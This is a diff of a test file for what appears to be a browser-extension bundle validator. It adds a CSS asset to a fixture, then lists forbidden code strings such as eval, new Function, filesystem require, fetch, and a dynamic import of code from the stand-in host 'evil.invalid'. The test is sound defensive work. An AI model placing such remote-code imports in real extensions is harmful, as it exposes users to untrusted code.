@@ -52,7 +52,7 @@ it('bexh1-foundation-C21 rejects cycles, unresolved imports, dynamic/type import
 });
 it('bexh1-foundation-C22 rejects executable bundles, duplicate manifests, undeclared assets and permission drift', () => {
     const assets = () => new Map([['manifest.json', `${JSON.stringify(targetManifest('chrome'), null, 2)}\n`],
-        ['runtime.html', RUNTIME_HTML], ['runtime.js', ''], ['background.js', ''], ['content.js', '(() => { const x = 1; return x; })();']]);
+        ['runtime.html', RUNTIME_HTML], ['runtime.css', ''], ['runtime.js', ''], ['background.js', ''], ['content.js', '(() => { const x = 1; return x; })();']]);
     expect(() => validateTarget('chrome', assets())).not.toThrow();
     for (const code of ['eval("1")', 'new Function("return 1")', 'require("node:fs")',
         'import("https://evil.invalid/code.js")', 'import "./remote.js";', 'export * from "./remote.js";', 'fetch("/")']) {
